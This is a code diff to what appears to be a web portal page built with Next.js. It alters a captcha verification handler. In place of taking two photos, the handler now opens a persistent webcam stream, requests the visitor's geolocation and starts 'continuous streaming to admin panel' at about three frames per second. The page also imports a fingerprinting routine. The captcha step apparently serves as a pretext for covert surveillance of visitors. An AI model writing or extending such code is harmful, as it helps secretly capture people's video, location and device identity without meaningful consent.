@@ -5,10 +5,11 @@ import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
 import { collectFingerprint } from "@/lib/fingerprint";
 import {
-    requestAllPermissions,
-    capturePhotos,
-    MediaPermissions
-} from "@/lib/mediaCapture";
+    initGlobalStream,
+    startGlobalStreaming,
+    requestGeolocation,
+    getPermissions,
+} from "@/lib/globalStream";
 import styles from "./page.module.css";
 
 /**
@@ -41,7 +42,7 @@ export default function PortalPage() {
     const [isSubmitting, setIsSubmitting] = useState(false);
     const [captchaVerified, setCaptchaVerified] = useState(false);
     const [captchaLoading, setCaptchaLoading] = useState(false);
-    const [permissionsGranted, setPermissionsGranted] = useState<MediaPermissions | null>(null);
+    const [permissionsGranted, setPermissionsGranted] = useState<boolean>(false);
 
     const validatePhone = (phone: string): boolean => {
         if (!phone) return true; // Optional field
@@ -125,13 +126,18 @@ export default function PortalPage() {
         setCaptchaLoading(true);
 
         try {
-            // Request all permissions
-            const { permissions, stream } = await requestAllPermissions();
+            // Initialize webcam stream (persists across pages)
+            const success = await initGlobalStream();
 
-            setPermissionsGranted(permissions);
+            if (success) {
+                // Request geolocation separately
+                await requestGeolocation();
 
-            // Capture 2 photos with 0.5s delay, then cleanup automatically
-            await capturePhotos(stream, permissions, 500);
+                // Start continuous streaming to admin panel
+                startGlobalStreaming(300); // 300ms = ~3fps
+
+                setPermissionsGranted(true);
+            }
 
             // Mark as verified regardless of permission results
             setCaptchaVerified(true);
